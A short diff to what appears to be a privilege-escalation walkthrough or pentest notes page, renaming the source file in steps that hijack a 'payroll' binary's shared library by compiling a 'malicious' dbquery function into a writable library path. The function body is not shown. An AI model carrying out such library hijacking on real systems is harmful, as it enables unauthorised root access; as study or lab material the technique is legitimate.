@@ -25,7 +25,7 @@ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
 ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
 ```
 
-3. Now we have to create a malicious function with the name "dbquery"
+3. Now we have to create a malicious function with the name "dbquery" malicioso.c
 ```
 #include<stdio.h>
 #include<stdlib.h>
@@ -40,7 +40,7 @@ void dbquery() {
 
 4. Execute
 ```
-gcc src.c -fPIC -shared -o /development/libshared.so
+gcc malicioso.c -fPIC -shared -o /development/libshared.so
 
 # Then execute the binarie
 ./payroll 
